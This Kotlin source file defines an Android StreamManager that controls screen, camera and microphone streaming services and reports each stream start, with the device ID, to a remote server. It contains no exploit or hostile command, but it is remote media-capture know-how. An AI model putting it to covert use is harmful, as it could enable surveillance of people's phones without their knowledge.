package com.abuzahra.manager.streaming

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import com.abuzahra.manager.Config
import com.abuzahra.manager.util.DeviceUtils
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.ConcurrentHashMap

/**
 * StreamManager - Unified manager for all streaming sessions
 * Manages screen, camera, and audio streams with lifecycle handling
 */
object StreamManager {
    
    private const val TAG = "StreamManager"
    private const val PREFS_NAME = "stream_manager_prefs"
    private const val KEY_ACTIVE_STREAMS = "active_streams"
    private const val KEY_STREAM_STATES = "stream_states"
    
    // Active stream sessions
    private val activeSessions = ConcurrentHashMap<String, StreamSession>()
    
    // Context reference
    private var appContext: Context? = null
    private lateinit var prefs: SharedPreferences
    
    // Gson instance
    private val gson = Gson()
    
    // Coroutine scope
    private val managerScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    
    // HTTP client for API calls
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    
    /**
     * Stream session data class
     */
    data class StreamSession(
        val streamId: String,
        val streamType: StreamConfig.StreamType,
        val config: StreamConfig.Configuration,
        var state: StreamConfig.StreamState,
        val createdAt: Long = System.currentTimeMillis()
    ) {
        fun toJson(): String = gson.toJson(this)
        
        companion object {
            fun fromJson(json: String): StreamSession = gson.fromJson(json, StreamSession::class.java)
        }
    }
    
    /**
     * Stream event listener interface
     */
    interface StreamEventListener {
        fun onStreamStarted(streamId: String, streamType: StreamConfig.StreamType)
        fun onStreamStopped(streamId: String, streamType: StreamConfig.StreamType)
        fun onStreamError(streamId: String, error: String)
        fun onStreamStateChanged(streamId: String, state: StreamConfig.StreamState)
    }
    
    private var eventListener: StreamEventListener? = null
    
    /**
     * Initialize the StreamManager
     */
    fun init(context: Context) {
        appContext = context.applicationContext
        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // Load saved states
        loadSavedStates()
        
        // Start health check
        startHealthCheck()
        
        Log.i(TAG, "StreamManager initialized")
    }
    
    /**
     * Set event listener
     */
    fun setEventListener(listener: StreamEventListener) {
        eventListener = listener
    }
    
    // ========== Screen Streaming ==========
    
    /**
     * Start screen stream
     */
    fun startScreenStream(
        config: StreamConfig.Configuration = StreamConfig.Presets.screenShareMedium(),
        resultCode: Int = ScreenStreamService.lastResultCode,
        resultData: Intent? = ScreenStreamService.lastPermissionData
    ): String {
        val streamId = config.streamId
        
        if (!ScreenStreamService.hasPermission() && resultCode == 0) {
            Log.e(TAG, "No MediaProjection permission")
            eventListener?.onStreamError(streamId, "No MediaProjection permission")
            return streamId
        }
        
        // Create session
        val session = StreamSession(
            streamId = streamId,
            streamType = StreamConfig.StreamType.SCREEN,
            config = config,
            state = StreamConfig.StreamState(
                streamId = streamId,
                streamType = StreamConfig.StreamType.SCREEN,
                startTime = System.currentTimeMillis(),
                isActive = true
            )
        )
        
        activeSessions[streamId] = session
        
        // Start service
        val intent = Intent(appContext, ScreenStreamService::class.java).apply {
            action = ScreenStreamService.ACTION_START_STREAM
            putExtra(ScreenStreamService.EXTRA_CONFIG, gson.toJson(config))
            putExtra(ScreenStreamService.EXTRA_RESULT_CODE, resultCode)
            putExtra(ScreenStreamService.EXTRA_RESULT_DATA, resultData)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            appContext?.startForegroundService(intent)
        } else {
            appContext?.startService(intent)
        }
        
        // Notify server
        notifyServerStreamStarted(session)
        
        eventListener?.onStreamStarted(streamId, StreamConfig.StreamType.SCREEN)
        Log.i(TAG, "Screen stream started: $streamId")
        
        return streamId
    }
    
    /**
     * Stop screen stream
     */
    fun stopScreenStream(streamId: String? = null) {
        val id = streamId ?: findActiveStreamId(StreamConfig.StreamType.SCREEN)
        
        if (id != null) {
            val intent = Intent(appContext, ScreenStreamService::class.java).apply {
                action = ScreenStreamService.ACTION_STOP_STREAM
            }
            appContext?.startService(intent)
            
            activeSessions.remove(id)
            saveStates()
            
            eventListener?.onStreamStopped(id, StreamConfig.StreamType.SCREEN)
            Log.i(TAG, "Screen stream stopped: $id")
        }
    }
    
    // ========== Camera Streaming ==========
    
    /**
     * Start camera stream
     */
    fun startCameraStream(
        config: StreamConfig.Configuration = StreamConfig.Presets.cameraStream(),
        cameraId: String = CameraStreamService.CAMERA_BACK
    ): String {
        val streamId = config.streamId
        
        // Create session
        val session = StreamSession(
            streamId = streamId,
            streamType = if (cameraId == CameraStreamService.CAMERA_FRONT) 
                StreamConfig.StreamType.CAMERA_FRONT 
            else 
                StreamConfig.StreamType.CAMERA_BACK,
            config = config,
            state = StreamConfig.StreamState(
                streamId = streamId,
                streamType = StreamConfig.StreamType.CAMERA_BACK,
                startTime = System.currentTimeMillis(),
                isActive = true
            )
        )
        
        activeSessions[streamId] = session
        
        // Start service
        val intent = Intent(appContext, CameraStreamService::class.java).apply {
            action = CameraStreamService.ACTION_START_STREAM
            putExtra(CameraStreamService.EXTRA_CONFIG, gson.toJson(config))
            putExtra(CameraStreamService.EXTRA_CAMERA_ID, cameraId)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            appContext?.startForegroundService(intent)
        } else {
            appContext?.startService(intent)
        }
        
        // Notify server
        notifyServerStreamStarted(session)
        
        eventListener?.onStreamStarted(streamId, session.streamType)
        Log.i(TAG, "Camera stream started: $streamId")
        
        return streamId
    }
    
    /**
     * Stop camera stream
     */
    fun stopCameraStream(streamId: String? = null) {
        val id = streamId ?: findActiveStreamId(StreamConfig.StreamType.CAMERA_BACK)
            ?: findActiveStreamId(StreamConfig.StreamType.CAMERA_FRONT)
        
        if (id != null) {
            val session = activeSessions[id]  // Get session BEFORE removing
            val streamType = session?.streamType ?: StreamConfig.StreamType.CAMERA_BACK
            
            val intent = Intent(appContext, CameraStreamService::class.java).apply {
                action = CameraStreamService.ACTION_STOP_STREAM
            }
            appContext?.startService(intent)
            
            activeSessions.remove(id)
            saveStates()
            
            eventListener?.onStreamStopped(id, streamType)
            Log.i(TAG, "Camera stream stopped: $id")
        }
    }
    
    /**
     * Switch camera
     */
    fun switchCamera(streamId: String? = null) {
        val intent = Intent(appContext, CameraStreamService::class.java).apply {
            action = CameraStreamService.ACTION_SWITCH_CAMERA
        }
        appContext?.startService(intent)
        Log.i(TAG, "Camera switch requested")
    }
    
    /**
     * Toggle camera torch
     */
    fun toggleTorch(streamId: String? = null) {
        val intent = Intent(appContext, CameraStreamService::class.java).apply {
            action = CameraStreamService.ACTION_TOGGLE_TORCH
        }
        appContext?.startService(intent)
        Log.i(TAG, "Torch toggle requested")
    }
    
    // ========== Audio Streaming ==========
    
    /**
     * Start audio stream
     */
    fun startAudioStream(
        config: StreamConfig.Configuration = StreamConfig.Presets.audioOnlyMic(),
        source: String = AudioStreamService.SOURCE_MICROPHONE,
        mediaProjectionResultCode: Int = 0,
        mediaProjectionData: Intent? = null
    ): String {
        val streamId = config.streamId
        
        // Create session
        val session = StreamSession(
            streamId = streamId,
            streamType = when (source) {
                AudioStreamService.SOURCE_DEVICE_AUDIO -> StreamConfig.StreamType.AUDIO_DEVICE
                else -> StreamConfig.StreamType.AUDIO_MIC
            },
            config = config,
            state = StreamConfig.StreamState(
                streamId = streamId,
                streamType = StreamConfig.StreamType.AUDIO_MIC,
                startTime = System.currentTimeMillis(),
                isActive = true
            )
        )
        
        activeSessions[streamId] = session
        
        // Start service
        val intent = Intent(appContext, AudioStreamService::class.java).apply {
            action = AudioStreamService.ACTION_START_STREAM
            putExtra(AudioStreamService.EXTRA_CONFIG, gson.toJson(config))
            putExtra(AudioStreamService.EXTRA_SOURCE, source)
            putExtra(AudioStreamService.EXTRA_MEDIA_PROJECTION_RESULT_CODE, mediaProjectionResultCode)
            putExtra(AudioStreamService.EXTRA_MEDIA_PROJECTION_DATA, mediaProjectionData)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            appContext?.startForegroundService(intent)
        } else {
            appContext?.startService(intent)
        }
        
        // Notify server
        notifyServerStreamStarted(session)
        
        eventListener?.onStreamStarted(streamId, session.streamType)
        Log.i(TAG, "Audio stream started: $streamId")
        
        return streamId
    }
    
    /**
     * Stop audio stream
     */
    fun stopAudioStream(streamId: String? = null) {
        val id = streamId ?: findActiveStreamId(StreamConfig.StreamType.AUDIO_MIC)
            ?: findActiveStreamId(StreamConfig.StreamType.AUDIO_DEVICE)
        
        if (id != null) {
            val intent = Intent(appContext, AudioStreamService::class.java).apply {
                action = AudioStreamService.ACTION_STOP_STREAM
            }
            appContext?.startService(intent)
            
            activeSessions.remove(id)
            saveStates()
            
            eventListener?.onStreamStopped(id, StreamConfig.StreamType.AUDIO_MIC)
            Log.i(TAG, "Audio stream stopped: $id")
        }
    }
    
    // ========== Unified Controls ==========
    
    /**
     * Stop all active streams
     */
    fun stopAllStreams() {
        activeSessions.keys.toList().forEach { streamId ->
            val session = activeSessions[streamId] ?: return@forEach
            
            when (session.streamType) {
                StreamConfig.StreamType.SCREEN -> stopScreenStream(streamId)
                StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> stopCameraStream(streamId)
                StreamConfig.StreamType.AUDIO_MIC, StreamConfig.StreamType.AUDIO_DEVICE -> stopAudioStream(streamId)
            }
        }
        
        activeSessions.clear()
        saveStates()
        
        Log.i(TAG, "All streams stopped")
    }
    
    /**
     * Pause stream
     */
    fun pauseStream(streamId: String) {
        val session = activeSessions[streamId] ?: return
        
        val intent = when (session.streamType) {
            StreamConfig.StreamType.SCREEN -> Intent(appContext, ScreenStreamService::class.java).apply {
                action = ScreenStreamService.ACTION_PAUSE_STREAM
            }
            StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> 
                Intent(appContext, CameraStreamService::class.java).apply {
                    action = CameraStreamService.ACTION_PAUSE_STREAM
                }
            StreamConfig.StreamType.AUDIO_MIC, StreamConfig.StreamType.AUDIO_DEVICE -> 
                Intent(appContext, AudioStreamService::class.java).apply {
                    action = AudioStreamService.ACTION_PAUSE_STREAM
                }
        }
        
        appContext?.startService(intent)
        session.state.paused = true
        
        Log.i(TAG, "Stream paused: $streamId")
    }
    
    /**
     * Resume stream
     */
    fun resumeStream(streamId: String) {
        val session = activeSessions[streamId] ?: return
        
        val intent = when (session.streamType) {
            StreamConfig.StreamType.SCREEN -> Intent(appContext, ScreenStreamService::class.java).apply {
                action = ScreenStreamService.ACTION_RESUME_STREAM
            }
            StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> 
                Intent(appContext, CameraStreamService::class.java).apply {
                    action = CameraStreamService.ACTION_RESUME_STREAM
                }
            StreamConfig.StreamType.AUDIO_MIC, StreamConfig.StreamType.AUDIO_DEVICE -> 
                Intent(appContext, AudioStreamService::class.java).apply {
                    action = AudioStreamService.ACTION_RESUME_STREAM
                }
        }
        
        appContext?.startService(intent)
        session.state.paused = false
        
        Log.i(TAG, "Stream resumed: $streamId")
    }
    
    // ========== State Management ==========
    
    /**
     * Get all active sessions
     */
    fun getActiveSessions(): Map<String, StreamSession> = activeSessions.toMap()
    
    /**
     * Get session by ID
     */
    fun getSession(streamId: String): StreamSession? = activeSessions[streamId]
    
    /**
     * Check if stream is active
     */
    fun isStreamActive(streamId: String): Boolean = activeSessions.containsKey(streamId)
    
    /**
     * Check if any stream of type is active
     */
    fun isStreamTypeActive(streamType: StreamConfig.StreamType): Boolean {
        return activeSessions.values.any { it.streamType == streamType }
    }
    
    /**
     * Get active stream IDs
     */
    fun getActiveStreamIds(): List<String> = activeSessions.keys.toList()
    
    /**
     * Update stream state
     */
    fun updateStreamState(streamId: String, state: StreamConfig.StreamState) {
        activeSessions[streamId]?.let { session ->
            session.state = state
            saveStates()
            eventListener?.onStreamStateChanged(streamId, state)
        }
    }
    
    /**
     * Find active stream ID by type
     */
    private fun findActiveStreamId(streamType: StreamConfig.StreamType): String? {
        return activeSessions.values.find { it.streamType == streamType }?.streamId
    }
    
    // ========== Server Communication ==========
    
    /**
     * Notify server of stream start
     */
    private fun notifyServerStreamStarted(session: StreamSession) {
        managerScope.launch {
            try {
                val deviceId = appContext?.let { DeviceUtils.getDeviceId(it) } ?: ""
                
                val body = mapOf(
                    "device_id" to deviceId,
                    "stream_id" to session.streamId,
                    "stream_type" to session.streamType.name,
                    "config" to session.config.toMap(),
                    "started_at" to session.createdAt
                )
                
                val json = gson.toJson(body)
                val request = Request.Builder()
                    .url("${Config.getBaseUrl()}/api/stream/start")
                    .post(json.toRequestBody("application/json".toMediaType()))
                    .build()
                
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Server notified of stream start: ${session.streamId}")
                    } else {
                        Log.w(TAG, "Failed to notify server: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error notifying server", e)
            }
        }
    }
    
    /**
     * Notify server of stream stop
     */
    private fun notifyServerStreamStopped(session: StreamSession) {
        managerScope.launch {
            try {
                val deviceId = appContext?.let { DeviceUtils.getDeviceId(it) } ?: ""
                
                val body = mapOf(
                    "device_id" to deviceId,
                    "stream_id" to session.streamId,
                    "stream_type" to session.streamType.name,
                    "duration" to (System.currentTimeMillis() - session.createdAt),
                    "bytes_sent" to session.state.totalBytesSent
                )
                
                val json = gson.toJson(body)
                val request = Request.Builder()
                    .url("${Config.getBaseUrl()}/api/stream/stop")
                    .post(json.toRequestBody("application/json".toMediaType()))
                    .build()
                
                httpClient.newCall(request).execute().use { response ->
                    Log.d(TAG, "Server notified of stream stop: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error notifying server", e)
            }
        }
    }
    
    // ========== Persistence ==========
    
    /**
     * Save states to SharedPreferences
     */
    private fun saveStates() {
        val statesJson = gson.toJson(activeSessions.mapValues { it.value.state.toMap() })
        prefs.edit().putString(KEY_STREAM_STATES, statesJson).apply()
    }
    
    /**
     * Load saved states
     */
    private fun loadSavedStates() {
        try {
            val statesJson = prefs.getString(KEY_STREAM_STATES, null) ?: return
            
            val type = object : TypeToken<Map<String, Map<String, Any>>>() {}.type
            val states: Map<String, Map<String, Any>> = gson.fromJson(statesJson, type)
            
            // Note: We don't auto-restore streams, just log for recovery info
            Log.i(TAG, "Found ${states.size} saved stream states")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error loading saved states", e)
        }
    }
    
    // ========== Health Check ==========
    
    /**
     * Start periodic health check
     */
    private fun startHealthCheck() {
        managerScope.launch {
            while (true) {
                delay(60000) // Check every minute
                
                // Update active stream states from services
                updateStreamStatesFromServices()
                
                // Clean up inactive sessions
                cleanupInactiveSessions()
            }
        }
    }
    
    /**
     * Update stream states from services
     */
    private fun updateStreamStatesFromServices() {
        // Update screen stream state
        ScreenStreamService.getStreamState()?.let { state ->
            activeSessions[state.streamId]?.let { session ->
                session.state.isActive = state.isActive
                session.state.paused = state.isPaused
                saveStates()
            }
        }
        
        // Update camera stream state
        CameraStreamService.getStreamState()?.let { state ->
            activeSessions[state.streamId]?.let { session ->
                session.state.isActive = state.isActive
                session.state.paused = state.isPaused
                saveStates()
            }
        }
        
        // Update audio stream state
        AudioStreamService.getStreamState()?.let { state ->
            activeSessions[state.streamId]?.let { session ->
                session.state.isActive = state.isActive
                session.state.paused = state.isPaused
                saveStates()
            }
        }
    }
    
    /**
     * Clean up inactive sessions
     */
    private fun cleanupInactiveSessions() {
        val inactiveIds = activeSessions.filter { 
            !it.value.state.isActive && 
            System.currentTimeMillis() - it.value.createdAt > 3600000 // 1 hour
        }.keys
        
        inactiveIds.forEach { activeSessions.remove(it) }
        
        if (inactiveIds.isNotEmpty()) {
            saveStates()
            Log.i(TAG, "Cleaned up ${inactiveIds.size} inactive sessions")
        }
    }
    
    // ========== Statistics ==========
    
    /**
     * Get streaming statistics
     */
    fun getStatistics(): Map<String, Any> {
        return mapOf(
            "active_streams" to activeSessions.size,
            "total_bytes_sent" to activeSessions.values.sumOf { it.state.totalBytesSent },
            "total_frames_encoded" to activeSessions.values.sumOf { it.state.totalFramesEncoded },
            "streams" to activeSessions.mapValues { (_, session) ->
                mapOf(
                    "type" to session.streamType.name,
                    "duration" to (System.currentTimeMillis() - session.createdAt),
                    "bytes_sent" to session.state.totalBytesSent,
                    "frames_encoded" to session.state.totalFramesEncoded,
                    "is_active" to session.state.isActive
                )
            }
        )
    }
}
